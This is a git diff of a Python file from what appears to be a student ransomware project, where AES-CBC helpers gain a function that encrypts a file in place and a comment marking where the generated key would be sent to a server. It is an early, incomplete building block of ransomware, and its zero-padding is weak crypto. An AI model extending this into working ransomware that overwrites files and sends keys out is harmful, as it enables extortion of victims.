@@ -10,6 +10,8 @@ from Crypto.Util import Counter
 
 from Crypto import Random
 
+#Encryption and decryption functions adapted from: https://stackoverflow.com/questions/20852664/python-pycrypto-encrypt-decrypt-text-files-with-aes
+
 
 def pad(s):
 	return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
@@ -17,10 +19,6 @@ def pad(s):
 def generateEncryptionKey(bits):
 	return os.urandom(bits)
 
-def getCipher(key):
-	iv = Random.new().read(AES.block_size)
-	cipher = AES.new(key, AES.MODE_CBC, iv)
-	return cipher
 
 def encrypt(message, key):
 	message = pad(message)
@@ -34,21 +32,13 @@ def decrypt(ciphertext, key):
 	plaintext = cipher.decrypt(ciphertext[AES.block_size:])
 	return plaintext.rstrip(b"\0")
 
-def encrypt_file(file_name, key):
-	with open(file_name, 'rb') as fo:
-	    plaintext = fo.read()
-	enc = encrypt(plaintext, key)
-	with open(file_name + ".enc", 'wb') as fo:
-	    fo.write(enc)
-	return file_name + ".enc"
-
-def decrypt_file(file_name, key):
-	with open(file_name, 'rb') as fo:
-	    ciphertext = fo.read()
-	dec = decrypt(ciphertext, key)
-	with open(file_name[:-4], 'wb') as fo:
-	   fo.write(dec)
-
+def performCrypto(file_name, key, cryptoFunc):
+	with open(file_name, 'r+b') as fo:
+		initial = fo.read()
+		resultant = cryptoFunc(initial, key)
+		fo.seek(0)
+		fo.truncate()
+		fo.write(resultant)
 	
 		
 
@@ -58,31 +48,14 @@ def decryptFile(file, cipher):
 
 if __name__ == '__main__':
 	#encrypt file and then decrtypt
-	#key = generateEncryptionKey(16)	
-	key = b'\x10\xcf6b\x1cD\x82\xd5\x86\x0e\xc5\xd3\x1c\\\xc2\xef'
-	cipher = getCipher(key)
-
-	print(key)
-
-	#data = 'hello world 1234'.encode()
+	key = generateEncryptionKey(16)
+	#send generated key here to server
 
 
-	#encd = encrypt(data, key)
+	filePath = "C:/Users/rayan/590Ransomware/map.png"
+	performCrypto(filePath, key, encrypt)
+	performCrypto(filePath, key, decrypt)
 
-
-	#print(data)
-	#print(encd)
-
-	#decd = decrypt(encd, key)
-
-	#print(decd.decode())
-
-
-	#decode 
-
-	filePath = "C:/Users/rayan/590Ransomware/plaintext.txt.enc"
-	#newFP = encrypt_file(filePath, key)
-	decrypt_file(filePath, key)
 
 
 	#print(plaintext.decode('cp437'))
